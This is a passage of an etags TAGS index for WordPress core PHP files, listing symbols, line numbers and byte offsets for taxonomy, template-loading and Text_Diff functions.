	$tt_id = $ids['term_taxonomy_id'];tt_id1753,56483
	$defaults = array();defaults1755,56520
	$args = wp_parse_args($args, $defaults);args1763,56729
		$default = (int) $default;default1767,56828
		$term_obj = get_term($term, $taxonomy);term_obj1774,57014
		$parent = $term_obj->parent;parent1777,57111
		$edit_tt_ids = $wpdb->get_col( "SELECT `term_taxonomy_id` FROM $wpdb->term_taxonomy WHERE `parent` = " . (int)$term_obj->term_id );edit_tt_ids1779,57143
	$objects = $wpdb->get_col( $wpdb->prepare( "SELECT object_id FROM $wpdb->term_relationships WHERE term_taxonomy_id = %d", $tt_id ) );objects1785,57515
		$terms = wp_get_object_terms($object, $taxonomy, array('fields' => 'ids', 'orderby' => 'none'));terms1788,57694
			$terms = array($default);terms1790,57842
			$terms = array_diff($terms, array($term));terms1792,57882
				$terms = array_merge($terms, array($default));terms1794,57995
		$terms = array_map('intval', $terms);terms1796,58050
	$tax_object = get_taxonomy( $taxonomy );tax_object1801,58216
function wp_delete_category( $cat_ID ) {wp_delete_category1831,59207
function wp_get_object_terms($object_ids, $taxonomies, $args = array()) {wp_get_object_terms1867,60792
function wp_get_object_terms($object_ids, $taxonomies, $args = array()) {args1867,60792
		$taxonomies = array($taxonomies);taxonomies1874,60985
		$object_ids = array($object_ids);object_ids1882,61211
	$object_ids = array_map('intval', $object_ids);object_ids1883,61247
	$defaults = array('orderby' => 'name', 'order' => 'ASC', 'fields' => 'all');defaults1885,61297
	$args = wp_parse_args( $args, $defaults );args1886,61375
	$terms = array();terms1888,61420
		foreach ( $taxonomies as $index => $taxonomy ) {index1890,61472
			$t = get_taxonomy($taxonomy);t1891,61523
				$terms = array_merge($terms, wp_get_object_terms($object_ids, $taxonomy, array_merge($args, $t->args)));terms1894,61679
		$t = get_taxonomy($taxonomies[0]);t1898,61807
			$args = array_merge($args, $t->args);args1900,61891
		$orderby = 'tt.count';orderby1906,61993
		$orderby = 't.name';orderby1908,62050
		$orderby = 't.slug';orderby1910,62105
		$orderby = 't.term_group';orderby1912,62166
		$orderby = 'tr.term_order';orderby1914,62233
		$orderby = '';orderby1916,62297
		$order = '';order1917,62314
		$orderby = 't.term_id';orderby1919,62339
		$orderby = 'tr.term_taxonomy_id';orderby1924,62478
		$orderby = "ORDER BY $orderby";orderby1927,62540
	$order = strtoupper( $order );order1929,62575
		$order = 'ASC';order1931,62677
	$taxonomies = "'" . implode("', '", $taxonomies) . "'";taxonomies1933,62696
	$object_ids = implode(', ', $object_ids);object_ids1934,62753
	$select_this = '';select_this1936,62797
		$select_this = 't.*, tt.*';select_this1938,62842
		$select_this = 't.term_id';select_this1940,62902
		$select_this = 't.name';select_this1942,62964
		$select_this = 't.slug';select_this1944,63023
		$select_this = 't.*, tt.*, tr.object_id';select_this1946,63095
	$query = "SELECT $select_this FROM $wpdb->terms AS t INNER JOIN $wpdb->term_taxonomy AS tt ON tt.term_id = t.term_id INNER JOIN $wpdb->term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id WHERE tt.taxonomy IN ($taxonomies) AND tr.object_id IN ($object_ids) $orderby $order";query1948,63140
		$terms = array_merge($terms, $wpdb->get_results($query));terms1951,63496
		$terms = array_merge($terms, $wpdb->get_col($query));terms1954,63663
		$terms = $wpdb->get_col("SELECT tr.term_taxonomy_id FROM $wpdb->term_relationships AS tr INNER JOIN $wpdb->term_taxonomy AS tt ON tr.term_taxonomy_id = tt.term_taxonomy_id WHERE tr.object_id IN ($object_ids) AND tt.taxonomy IN ($taxonomies) $orderby $order");terms1956,63756
		$terms = array();terms1960,64039
function wp_insert_term( $term, $taxonomy, $args = array() ) {wp_insert_term2018,66824
function wp_insert_term( $term, $taxonomy, $args = array() ) {args2018,66824
	$term = apply_filters( 'pre_insert_term', $term, $taxonomy );term2024,67008
	$defaults = array( 'alias_of' => '', 'description' => '', 'parent' => 0, 'slug' => '');defaults2034,67330
	$args = wp_parse_args($args, $defaults);args2035,67419
	$args = sanitize_term($args, $taxonomy, 'db');args2038,67517
	$name = stripslashes($name);name2042,67623
	$description = stripslashes($description);description2043,67653
		$slug = sanitize_title($name);slug2046,67719
	$term_group = 0;term_group2048,67753
		$alias = $wpdb->get_row( $wpdb->prepare( "SELECT term_id, term_group FROM $wpdb->terms WHERE slug = %s", $alias_of) );alias2050,67791
			$term_group = $alias->term_group;term_group2053,68012
			$term_group = $wpdb->get_var("SELECT MAX(term_group) FROM $wpdb->terms") + 1;term_group2056,68158
	if ( $term_id = term_exists($slug) ) {term_id2063,68436
		$existing_term = $wpdb->get_row( $wpdb->prepare( "SELECT name FROM $wpdb->terms WHERE term_id = %d", $term_id), ARRAY_A );existing_term2064,68476
		if ( is_taxonomy_hierarchical($taxonomy) && $existing_term['name'] == $name && $exists = term_exists( (int) $term_id, $taxonomy ) ) {exists2066,68695
			$siblings = get_terms($taxonomy, array('fields' => 'names', 'get' => 'all', 'parent' => (int)$parent) );siblings2068,68928
				$slug = wp_unique_term_slug($slug, (object) $args);slug2072,69217
				$term_id = (int) $wpdb->insert_id;term_id2075,69476
			$slug = wp_unique_term_slug($slug, (object) $args);slug2079,69647
			$term_id = (int) $wpdb->insert_id;term_id2082,69903
		} elseif ( $exists = term_exists( (int) $term_id, $taxonomy ) )  {exists2083,69941
		$slug = wp_unique_term_slug($slug, (object) $args);slug2089,70229
		$term_id = (int) $wpdb->insert_id;term_id2092,70482
		$slug = sanitize_title($slug, $term_id);slug2097,70664
	$tt_id = $wpdb->get_var( $wpdb->prepare( "SELECT tt.term_taxonomy_id FROM $wpdb->term_taxonomy AS tt INNER JOIN $wpdb->terms AS t ON tt.term_id = t.term_id WHERE tt.taxonomy = %s AND t.term_id = %d", $taxonomy, $term_id ) );tt_id2103,70865
	$tt_id = (int) $wpdb->insert_id;tt_id2109,71307
	$term_id = apply_filters('term_id_filter', $term_id, $tt_id);term_id2114,71449
function wp_set_object_terms($object_id, $terms, $taxonomy, $append = false) {wp_set_object_terms2147,72620
function wp_set_object_terms($object_id, $terms, $taxonomy, $append = false) {append2147,72620
	$object_id = (int) $object_id;object_id2150,72715
		$terms = array($terms);terms2156,72879
		$old_tt_ids =  wp_get_object_terms($object_id, $taxonomy, array('fields' => 'tt_ids', 'orderby' => 'none'));old_tt_ids2159,72924
		$old_tt_ids = array();old_tt_ids2161,73041
	$tt_ids = array();tt_ids2163,73067
	$term_ids = array();term_ids2164,73087
	$new_tt_ids = array();new_tt_ids2165,73109
			$term_info = wp_insert_term($term, $taxonomy);term_info2175,73357
		$tt_id = $term_info['term_taxonomy_id'];tt_id2180,73505
		$delete_terms = array_diff($old_tt_ids, $tt_ids);delete_terms2195,74108
			$in_delete_terms = "'" . implode("', '", $delete_terms) . "'";in_delete_terms2197,74185
	$t = get_taxonomy($taxonomy);t2205,74607
		$values = array();values2207,74689
		$term_order = 0;term_order2208,74710
		$final_tt_ids = wp_get_object_terms($object_id, $taxonomy, array('fields' => 'tt_ids'));final_tt_ids2209,74729
function wp_unique_term_slug($slug, $term) {wp_unique_term_slug2245,76197
		$the_parent = $term->parent;the_parent2254,76505
			$parent_term = get_term($the_parent, $term->taxonomy);parent_term2256,76571
			$the_parent = $parent_term->parent;the_parent2265,76838
		$query = $wpdb->prepare( "SELECT slug FROM $wpdb->terms WHERE slug = %s AND term_id != %d", $slug, $args['term_id'] );query2271,76996
		$query = $wpdb->prepare( "SELECT slug FROM $wpdb->terms WHERE slug = %s", $slug );query2273,77123
		$num = 2;num2276,77244
			$alt_slug = $slug . "-$num";alt_slug2278,77263
			$slug_check = $wpdb->get_var( $wpdb->prepare( "SELECT slug FROM $wpdb->terms WHERE slug = %s", $alt_slug ) );slug_check2280,77306
		$slug = $alt_slug;slug2282,77446
function wp_update_term( $term_id, $taxonomy, $args = array() ) {wp_update_term2323,78891
function wp_update_term( $term_id, $taxonomy, $args = array() ) {args2323,78891
	$term_id = (int) $term_id;term_id2329,79078
	$term = get_term ($term_id, $taxonomy, ARRAY_A);term2332,79147
	$term = add_magic_quotes($term);term2338,79276
	$args = array_merge($term, $args);args2341,79374
	$defaults = array( 'alias_of' => '', 'description' => '', 'parent' => 0, 'slug' => '');defaults2343,79411
	$args = wp_parse_args($args, $defaults);args2344,79500
	$args = sanitize_term($args, $taxonomy, 'db');args2345,79542
	$name = stripslashes($name);name2349,79648
	$description = stripslashes($description);description2350,79678
	$empty_slug = false;empty_slug2355,79832
		$empty_slug = true;empty_slug2357,79877
		$slug = sanitize_title($name);slug2358,79899
		$alias = $wpdb->get_row( $wpdb->prepare( "SELECT term_id, term_group FROM $wpdb->terms WHERE slug = %s", $alias_of) );alias2362,79956
			$term_group = $alias->term_group;term_group2365,80177
			$term_group = $wpdb->get_var("SELECT MAX(term_group) FROM $wpdb->terms") + 1;term_group2368,80323
	$parent = apply_filters( 'wp_update_term_parent', $parent, $term_id, $taxonomy, compact( array_keys( $args ) ), $args );parent2376,80663
	$id = $wpdb->get_var( $wpdb->prepare( "SELECT term_id FROM $wpdb->terms WHERE slug = %s", $slug ) );id2379,80815
			$slug = wp_unique_term_slug($slug, (object) $args);slug2384,81120
		$slug = sanitize_title($name, $term_id);slug2391,81470
	$tt_id = $wpdb->get_var( $wpdb->prepare( "SELECT tt.term_taxonomy_id FROM $wpdb->term_taxonomy AS tt INNER JOIN $wpdb->terms AS t ON tt.term_id = t.term_id WHERE tt.taxonomy = %s AND t.term_id = %d", $taxonomy, $term_id) );tt_id2396,81631
	$term_id = apply_filters('term_id_filter', $term_id, $tt_id);term_id2404,82210
function wp_defer_term_counting($defer=null) {wp_defer_term_counting2422,82687
	static $_defer = false;_defer2423,82734
	static $_defer = false;_defer2423,82734
		$_defer = $defer;_defer2426,82786
function wp_update_term_count( $terms, $taxonomy, $do_deferred=false ) {wp_update_term_count2453,83495
function wp_update_term_count( $terms, $taxonomy, $do_deferred=false ) {do_deferred2453,83495
	static $_deferred = array();_deferred2454,83568
	static $_deferred = array();_deferred2454,83568
		$terms = array($terms);terms2467,83835
function wp_update_term_count_now( $terms, $taxonomy ) {wp_update_term_count_now2488,84366
	$terms = array_map('intval', $terms);terms2491,84439
	$taxonomy = get_taxonomy($taxonomy);taxonomy2493,84479
		$object_types = (array) $taxonomy->object_type;object_types2497,84649
		if ( $object_types == array_filter( $object_types, 'post_type_exists' ) ) {object_types2503,84862
 *	Passes, function params in same order.params2534,85674
function clean_object_term_cache($object_ids, $object_type) {clean_object_term_cache2539,85852
		$object_ids = array($object_ids);object_ids2541,85945
function clean_term_cache($ids, $taxonomy = '', $clean_taxonomy = true) {clean_term_cache2562,86627
function clean_term_cache($ids, $taxonomy = '', $clean_taxonomy = true) {taxonomy2562,86627
	static $cleaned = array();cleaned2564,86716
	static $cleaned = array();cleaned2564,86716
		$ids = array($ids);ids2567,86769
	$taxonomies = array();taxonomies2569,86792
		$tt_ids = array_map('intval', $ids);tt_ids2572,86878
		$tt_ids = implode(', ', $tt_ids);tt_ids2573,86917
		$terms = $wpdb->get_results("SELECT term_id, taxonomy FROM $wpdb->term_taxonomy WHERE term_taxonomy_id IN ($tt_ids)");terms2574,86953
		$ids = array();ids2575,87074
		$taxonomies = array_unique($taxonomies);taxonomies2581,87253
		$taxonomies = array($taxonomy);taxonomies2583,87306
function &get_object_term_cache($id, $taxonomy) {get_object_term_cache2623,88322
	$cache = wp_cache_get($id, "{$taxonomy}_relationships");cache2624,88372
 * is advised that the function is not called very often or at least not for ais2637,88726
function update_object_term_cache($object_ids, $object_type) {update_object_term_cache2650,89318
		$object_ids = explode(',', $object_ids);object_ids2655,89450
	$object_ids = array_map('intval', $object_ids);object_ids2657,89494
	$taxonomies = get_object_taxonomies($object_type);taxonomies2659,89544
	$ids = array();ids2661,89597
	$terms = wp_get_object_terms($ids, $taxonomies, array('fields' => 'all_with_object_id'));terms2674,89847
	$object_terms = array();object_terms2676,89939
	foreach ( $object_terms as $id => $value ) {id2690,90329
		foreach ( $value as $taxonomy => $terms ) {taxonomy2691,90375
function update_term_cache($terms, $taxonomy = '') {update_term_cache2707,90736
function update_term_cache($terms, $taxonomy = '') {taxonomy2707,90736
		$term_taxonomy = $taxonomy;term_taxonomy2709,90828
			$term_taxonomy = $term->taxonomy;term_taxonomy2711,90889
function _get_term_hierarchy($taxonomy) {_get_term_hierarchy2735,91439
	$children = get_option("{$taxonomy}_children");children2738,91544
	$children = array();children2742,91642
	$terms = get_terms($taxonomy, array('get' => 'all', 'orderby' => 'id', 'fields' => 'id=>parent'));terms2743,91664
	foreach ( $terms as $term_id => $parent ) {term_id2744,91764
function &_get_term_children($term_id, $terms, $taxonomy) {_get_term_children2769,92682
	$empty_array = array();empty_array2770,92742
	$term_list = array();term_list2774,92813
	$has_children = _get_term_hierarchy($taxonomy);has_children2775,92836
		$use_id = false;use_id2781,93012
			$term = get_term($term, $taxonomy);term2783,93060
			$use_id = true;use_id2786,93148
			if ( $children = _get_term_children($term->term_id, $terms, $taxonomy) )children2801,93410
				$term_list = array_merge($term_list, $children);term_list2802,93486
 * @return null Will break from function if conditions are not met.if2823,93935
function _pad_term_counts(&$terms, $taxonomy) {_pad_term_counts2825,94007
	// This function only works for hierarchical taxonomies like post categories.only2828,94071
	$term_hier = _get_term_hierarchy($taxonomy);term_hier2832,94208
	$term_items = array();term_items2837,94292
	foreach ( (array) $terms as $key => $term ) {key2839,94317
	$tax_obj = get_taxonomy($taxonomy);tax_obj2845,94537
	$object_types = esc_sql($tax_obj->object_type);object_types2846,94574
	$results = $wpdb->get_results("SELECT object_id, term_taxonomy_id FROM $wpdb->term_relationships INNER JOIN $wpdb->posts ON object_id = ID WHERE term_taxonomy_id IN (" . implode(',', array_keys($term_ids)) . ") AND post_type IN ('" . implode("', '", $object_types) . "') AND post_status = 'publish'");results2847,94623
		$id = $term_ids[$row->term_taxonomy_id];id2849,94958
		$child = $term_id;child2855,95229
		while ( !empty( $terms_by_id[$child] ) && $parent = $terms_by_id[$child]->parent ) {parent2856,95250
				foreach ( $term_items[$term_id] as $item_id => $touches ) {item_id2858,95379
			$child = $parent;child2861,95564
	foreach ( (array) $term_items as $id => $items )id2866,95624
 * Private function for the default callback for post_tag and categoryfor2878,95864
function _update_post_term_count( $terms, $taxonomy ) {_update_post_term_count2890,96165
	$object_types = (array) $taxonomy->object_type;object_types2893,96237
	$object_types = array_unique( $object_types );object_types2898,96387
	if ( false !== ( $check_attachments = array_search( 'attachment', $object_types ) ) ) {check_attachments2900,96436
		$check_attachments = true;check_attachments2902,96573
		$object_types = esc_sql( array_filter( $object_types, 'post_type_exists' ) );object_types2906,96628
		$count = 0;count2909,96748
function _update_generic_term_count( $terms, $taxonomy ) {_update_generic_term_count2937,98137
		$count = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM $wpdb->term_relationships WHERE term_taxonomy_id = %d", $term ) );count2941,98251
function get_term_link( $term, $taxonomy = '') {get_term_link2962,99210
function get_term_link( $term, $taxonomy = '') {taxonomy2962,99210
			$term = &get_term($term, $taxonomy);term2967,99334
			$term = &get_term_by('slug', $term, $taxonomy);term2969,99385
		$term = new WP_Error('invalid_term', __('Empty Term'));term2974,99470
	$taxonomy = $term->taxonomy;taxonomy2979,99575
	$termlink = $wp_rewrite->get_extra_permastruct($taxonomy);termlink2981,99606
	$slug = $term->slug;slug2983,99667
	$t = get_taxonomy($taxonomy);t2984,99689
			$termlink = '?cat=' . $term->term_id;termlink2988,99781
			$termlink = "?$t->query_var=$slug";termlink2990,99849
			$termlink = "?taxonomy=$taxonomy&term=$slug";termlink2992,99895
		$termlink = home_url($termlink);termlink2993,99944
			$hierarchical_slugs = array();hierarchical_slugs2996,100028
			$ancestors = get_ancestors($term->term_id, $taxonomy);ancestors2997,100062
				$ancestor_term = get_term($ancestor, $taxonomy);ancestor_term2999,100168
			$hierarchical_slugs = array_reverse($hierarchical_slugs);hierarchical_slugs3002,100276
			$termlink = str_replace("%$taxonomy%", implode('/', $hierarchical_slugs), $termlink);termlink3004,100371
			$termlink = str_replace("%$taxonomy%", $slug, $termlink);termlink3006,100471
		$termlink = home_url( user_trailingslashit($termlink, 'category') );termlink3008,100536
		$termlink = apply_filters( 'tag_link', $termlink, $term->term_id );termlink3012,100667
		$termlink = apply_filters( 'category_link', $termlink, $term->term_id );termlink3014,100773
 * This function can be used within the loop to display the taxonomies for acan3022,100984
function the_taxonomies($args = array()) {the_taxonomies3038,101683
	$defaults = array(defaults3039,101726
	$r = wp_parse_args( $args, $defaults );r3047,101843
 * This function can be used within the loop. It will also return an array ofcan3056,102041
function get_the_taxonomies($post = 0, $args = array() ) {get_the_taxonomies3065,102338
function get_the_taxonomies($post = 0, $args = array() ) {args3065,102338
		$post =& get_post($post);post3067,102419
		$post =& $GLOBALS['post'];post3069,102477
	$args = wp_parse_args( $args, array(args3071,102507
	$taxonomies = array();taxonomies3076,102609
		$t = (array) get_taxonomy($taxonomy);t3082,102729
		$terms = get_object_term_cache($post->ID, $taxonomy);terms3090,102940
			$terms = wp_get_object_terms($post->ID, $taxonomy, $t['args']);terms3092,103019
		$links = array();links3094,103087
function get_post_taxonomies($post = 0) {get_post_taxonomies3114,103527
	$post =& get_post($post);post3115,103569
function is_object_in_term( $object_id, $taxonomy, $terms = null ) {is_object_in_term3136,104333
function is_object_in_term( $object_id, $taxonomy, $terms = null ) {terms3136,104333
	$object_terms = get_object_term_cache( $object_id, $taxonomy );object_terms3140,104512
		 $object_terms = wp_get_object_terms( $object_id, $taxonomy );object_terms3142,104608
	$terms = (array) $terms;terms3151,104845
	if ( $ints = array_filter( $terms, 'is_int' ) )ints3153,104872
		$strs = array_diff( $terms, $ints );strs3154,104921
		$strs =& $terms;strs3156,104966
function is_object_in_taxonomy($object_type, $taxonomy) {is_object_in_taxonomy3180,105689
	$taxonomies = get_object_taxonomies($object_type);taxonomies3181,105747
function get_ancestors($object_id = 0, $object_type = '') {get_ancestors3199,106189
function get_ancestors($object_id = 0, $object_type = '') {object_type3199,106189
	$object_id = (int) $object_id;object_id3200,106249
	$ancestors = array();ancestors3202,106282
		$term = get_term($object_id, $object_type);term3209,106470
			$term = get_term($term->parent, $object_type);term3212,106661
		$object = get_post($object_id);object3215,106777
			$ancestors = $object->ancestors;ancestors3217,106910
				$object = get_post($object->post_parent);object3221,107125
function wp_get_term_taxonomy_parent_id( $term_id, $taxonomy ) {wp_get_term_taxonomy_parent_id3239,107422
	$term = get_term( $term_id, $taxonomy );term3240,107487
function wp_check_term_hierarchy_for_loops( $parent, $term_id, $taxonomy ) {wp_check_term_hierarchy_for_loops3261,108101
	if ( $parent == $term_id )parent3267,108266

wordpress/wp-includes/template-loader.php,1607
	$template = false;template22,471
	if     ( is_404()            && $template = get_404_template()            ) :template23,491
	elseif ( is_search()         && $template = get_search_template()         ) :template24,570
	elseif ( is_tax()            && $template = get_taxonomy_template()       ) :template25,649
	elseif ( is_front_page()     && $template = get_front_page_template()     ) :template26,728
	elseif ( is_home()           && $template = get_home_template()           ) :template27,807
	elseif ( is_attachment()     && $template = get_attachment_template()     ) :template28,886
	elseif ( is_single()         && $template = get_single_template()         ) :template30,1019
	elseif ( is_page()           && $template = get_page_template()           ) :template31,1098
	elseif ( is_category()       && $template = get_category_template()       ) :template32,1177
	elseif ( is_tag()            && $template = get_tag_template()            ) :template33,1256
	elseif ( is_author()         && $template = get_author_template()         ) :template34,1335
	elseif ( is_date()           && $template = get_date_template()           ) :template35,1414
	elseif ( is_archive()        && $template = get_archive_template()        ) :template36,1493
	elseif ( is_comments_popup() && $template = get_comments_popup_template() ) :template37,1572
	elseif ( is_paged()          && $template = get_paged_template()          ) :template38,1651
		$template = get_index_template();template40,1738
	if ( $template = apply_filters( 'template_include', $template ) )template42,1782

wordpress/wp-includes/template.php,3330
function get_query_template( $type, $templates = array() ) {get_query_template23,611
function get_query_template( $type, $templates = array() ) {templates23,611
	$type = preg_replace( '|[^a-z0-9-]+|', '', $type );type24,672
		$templates = array("{$type}.php");templates27,754
function get_index_template() {get_index_template39,985
function get_404_template() {get_404_template50,1169
function get_archive_template() {get_archive_template61,1353
	$post_type = get_query_var( 'post_type' );post_type62,1387
	$templates = array();templates64,1432
function get_author_template() {get_author_template80,1723
	$author = get_queried_object();author81,1756
	$templates = array();templates83,1790
function get_category_template() {get_category_template104,2430
	$category = get_queried_object();category105,2465
	$templates = array();templates107,2501
function get_tag_template() {get_tag_template128,3121
	$tag = get_queried_object();tag129,3151
	$templates = array();templates131,3182
function get_taxonomy_template() {get_taxonomy_template157,4035
	$term = get_queried_object();term158,4070
	$taxonomy = $term->taxonomy;taxonomy159,4101
	$templates = array();templates161,4132
function get_date_template() {get_date_template177,4457
function get_home_template() {get_home_template193,4867
	$templates = array( 'home.php', 'index.php' );templates194,4898
function get_front_page_template() {get_front_page_template209,5232
	$templates = array('front-page.php');templates210,5269
function get_page_template() {get_page_template226,5640
	$id = get_queried_object_id();id227,5671
	$template = get_page_template_slug();template228,5703
	$pagename = get_query_var('pagename');pagename229,5742
		$post = get_queried_object();post233,5923
		$pagename = $post->post_name;pagename234,5955
	$templates = array();templates237,5991
function get_paged_template() {get_paged_template256,6394
function get_search_template() {get_search_template267,6581
function get_single_template() {get_single_template278,6770
	$object = get_queried_object();object279,6803
	$templates = array();templates281,6837
function get_attachment_template() {get_attachment_template304,7517
	$type = explode('/', $posts[0]->post_mime_type);type306,7570
	if ( $template = get_query_template($type[0]) )template307,7620
	elseif ( $template = get_query_template($type[1]) )template309,7689
	elseif ( $template = get_query_template("$type[0]_$type[1]") )template311,7762
function get_comments_popup_template() {get_comments_popup_template328,8197
	$template = get_query_template( 'comments_popup', array( 'comments-popup.php' ) );template329,8238
		$template = ABSPATH . WPINC . '/theme-compat/comments-popup.php';template333,8406
function locate_template($template_names, $load = false, $require_once = true ) {locate_template351,9066
function locate_template($template_names, $load = false, $require_once = true ) {load351,9066
	$located = '';located352,9148
			$located = STYLESHEETPATH . '/' . $template_name;located357,9320
			$located = TEMPLATEPATH . '/' . $template_name;located360,9450
function load_template( $_template_file, $require_once = true ) {load_template383,10016
function load_template( $_template_file, $require_once = true ) {require_once383,10016

wordpress/wp-includes/Text/Diff/Engine/native.php,3151
 * This class is implemented using native PHP code.is5,82
class Text_Diff_Engine_native {Text_Diff_Engine_native29,1141
    function diff($from_lines, $to_lines)diff31,1174
        $n_from = count($from_lines);n_from36,1359
        $n_to = count($to_lines);n_to37,1397
        $this->xchanged = $this->ychanged = array();xchanged39,1432
        $this->xv = $this->yv = array();xv40,1485
        $this->xind = $this->yind = array();xind41,1526
        $xi = $n_from; $yi = $n_to;xi55,1978
            $line = $to_lines[$yi];line68,2485
            $line = $from_lines[$xi];line77,2794
        $edits = array();edits93,3347
        $xi = $yi = 0;xi94,3373
            $copy = array();copy100,3598
            $delete = array();delete111,3964
            $add = array();add116,4118
     * This function assumes that the first lines of the specified portions ofassumes144,5151
    function _diag ($xoff, $xlim, $yoff, $ylim, $nchunks)_diag149,5438
        $flip = false;flip151,5502
            $flip = true;flip156,5692
        $this->lcs = 0;lcs171,6111
        $this->in_seq = array();in_seq173,6169
        $numer = $xlim - $xoff + $nchunks - 1;numer176,6232
        $x = $xoff;x177,6279
            $x1 = $xoff + (int)(($numer + ($xlim - $xoff) * $chunk) / $nchunks);x1185,6534
                $line = $flip ? $this->yv[$x] : $this->xv[$x];line187,6652
                $matches = $ymatches[$line];matches191,6810
                        $k = $this->_lcsPos($y);k195,6994
                        $k = $this->_lcsPos($y);k210,7718
        $ymid = $ymids[$this->lcs];ymid219,7994
            $x1 = $xoff + (int)(($numer + ($xlim - $xoff) * $n) / $nchunks);x1221,8078
            $y1 = $ymid[$n] + 1;y1222,8155
    function _lcsPos($ypos)_lcsPos230,8381
        $end = $this->lcs;end232,8415
        $beg = 1;beg239,8621
            $mid = (int)(($beg + $end) / 2);mid241,8669
                $beg = $mid + 1;beg243,8758
                $end = $mid;end245,8812
    function _compareseq ($xoff, $xlim, $yoff, $ylim)_compareseq269,9512
        if ($xoff == $xlim || $yoff == $ylim) {yoff285,9997
            $lcs = 0;lcs286,10045
            /* This is ad hoc but seems to work well.  $nchunks =nchunks288,10084
             * sqrt(min($xlim - $xoff, $ylim - $yoff) / 2.5); $nchunks =nchunks289,10150
            $nchunks = min(7, $xlim - $xoff, $ylim - $yoff) + 1;nchunks291,10270
            $pt1 = $seps[0];pt1308,10906
                $pt1 = $pt2;pt1311,11049
    function _shiftBoundaries($lines, &$changed, $other_changed)_shiftBoundaries328,11658
        $i = 0;i330,11729
        $j = 0;j331,11745
        $len = count($lines);len334,11814
        $other_len = count($other_changed);other_len335,11844
             * Furthermore, $j is always kept so that $j == $other_len orj347,12365
            $start = $i;start365,12919
                $runlength = $i - $start;runlength375,13249
                $corresponding = $j < $other_len ? $i : $len;corresponding397,14267
                        $corresponding = $i;corresponding414,15109

wordpress/wp-includes/Text/Diff/Engine/shell.php,1202
 * This class uses the Unix `diff` program via shell_exec to compute theuses5,77
class Text_Diff_Engine_shell {Text_Diff_Engine_shell17,511
    var $_diffCommand = 'diff';_diffCommand24,620
    var $_diffCommand = 'diff';_diffCommand24,620
    function diff($from_lines, $to_lines)diff34,918
        $temp_dir = Text_Diff::_getTempDir();temp_dir39,1103
        $from_file = tempnam($temp_dir, 'Text_Diff');from_file42,1218
        $to_file = tempnam($temp_dir, 'Text_Diff');to_file43,1272
        $fp = fopen($from_file, 'w');fp44,1324
        $fp = fopen($to_file, 'w');fp47,1432
        $diff = shell_exec($this->_diffCommand . ' ' . $from_file . ' ' . $to_file);diff50,1536
        $from_line_no = 1;from_line_no59,1815
        $to_line_no = 1;to_line_no60,1842
        $edits = array();edits61,1867
                assert('$match[1] - $from_line_no == $match[4] - $to_line_no');from_line_no86,2582
    function _getLines(&$text_lines, &$line_no, $end = false)_getLines145,4725
    function _getLines(&$text_lines, &$line_no, $end = false)end145,4725
            $lines = array();lines148,4821
            $lines = array(array_shift($text_lines));lines155,5049

wordpress/wp-includes/Text/Diff/Engine/string.php,1539
 * $patch = file_get_contents('example.patch');patch7,104
 * $diff = new Text_Diff('string', array($patch));diff8,152
 * $renderer = new Text_Diff_Renderer_inline();renderer9,203
class Text_Diff_Engine_string {Text_Diff_Engine_string23,653
    function diff($diff, $mode = 'autodetect')diff38,1224
    function diff($diff, $mode = 'autodetect')mode38,1224
        $lnbr = "\n";lnbr41,1308
            $lnbr = "\r\n";lnbr43,1377
            $lnbr = "\r";lnbr45,1456
            $context = strpos($diff, '***');context58,1837
            $unified = strpos($diff, '---');unified59,1882
            } elseif ($context === false || $unified === false) {unified62,2047
                $mode = $context !== false ? 'context' : 'unified';mode63,2113
                $mode = $context < $unified ? 'context' : 'unified';mode65,2202
        $diff = explode($lnbr, $diff);diff70,2370
    function parseUnifiedDiff($diff)parseUnifiedDiff91,2968
        $edits = array();edits93,3011
        $end = count($diff) - 1;end94,3037
            $diff1 = array();diff196,3105
                $diff2 = array();diff2115,3792
    function parseContextDiff(&$diff)parseContextDiff146,4661
        $edits = array();edits148,4705
        $i = $max_i = $j = $max_j = 0;i149,4731
        $end = count($diff) - 1;end150,4770
            $array = array();array169,5570
                $diff1 = array();diff1196,6449
                    $diff2 = array();diff2199,6560
                $diff2 = array();diff2226,7646

wordpress/wp-includes/Text/Diff/Engine/xdiff.php,519
 * This class uses the xdiff PECL package (http://pecl.php.net/package/xdiff)uses5,77
class Text_Diff_Engine_xdiff {Text_Diff_Engine_xdiff16,509
    function diff($from_lines, $to_lines)diff20,557
        $from_string = implode("\n", $from_lines);from_string26,820
        $to_string = implode("\n", $to_lines);to_string27,871
        $diff = xdiff_string_diff($from_string, $to_string, count($to_lines));diff30,990
        $diff = explode("\n", $diff);diff31,1069
        $edits = array();edits41,1623

wordpress/wp-includes/Text/Diff/Renderer/inline.php,2709
 * This class renders diffs in the Wiki-style "inline" format.renders22,455
class Text_Diff_Renderer_inline extends Text_Diff_Renderer {Text_Diff_Renderer_inline27,576
    var $_leading_context_lines = 10000;_leading_context_lines34,735
    var $_leading_context_lines = 10000;_leading_context_lines34,735
    var $_trailing_context_lines = 10000;_trailing_context_lines41,875
    var $_trailing_context_lines = 10000;_trailing_context_lines41,875
    var $_ins_prefix = '<ins>';_ins_prefix48,993
    var $_ins_prefix = '<ins>';_ins_prefix48,993
    var $_ins_suffix = '</ins>';_ins_suffix55,1101
    var $_ins_suffix = '</ins>';_ins_suffix55,1101
    var $_del_prefix = '<del>';_del_prefix62,1209
    var $_del_prefix = '<del>';_del_prefix62,1209
    var $_del_suffix = '</del>';_del_suffix69,1316
    var $_del_suffix = '</del>';_del_suffix69,1316
    var $_block_header = '';_block_header76,1429
    var $_block_header = '';_block_header76,1429
    var $_split_characters = false;_split_characters83,1551
    var $_split_characters = false;_split_characters83,1551
    var $_split_level = 'lines';_split_level91,1743
    var $_split_level = 'lines';_split_level91,1743
    function _blockHeader($xbeg, $xlen, $ybeg, $ylen)_blockHeader93,1777
    function _startBlock($header)_startBlock98,1881
    function _lines($lines, $prefix = ' ', $encode = true)_lines103,1952
    function _lines($lines, $prefix = ' ', $encode = true)prefix103,1952
    function _added($lines)_added116,2278
    function _deleted($lines, $words = false)_deleted124,2532
    function _deleted($lines, $words = false)words124,2532
    function _changed($orig, $final)_changed132,2804
            $prefix = '';prefix142,3165
        $text1 = implode("\n", $orig);text1153,3611
        $text2 = implode("\n", $final);text2154,3650
        $nl = "\0";nl157,3734
            $diff = new Text_Diff('native',diff160,3795
            $diff = new Text_Diff('native',diff167,4202
        $renderer = new Text_Diff_Renderer_inlinerenderer173,4454
    function _splitOnWords($string, $newlineEscape = "\n")_splitOnWords181,4778
    function _splitOnWords($string, $newlineEscape = "\n")newlineEscape181,4778
        $string = str_replace("\0", '', $string);string184,4909
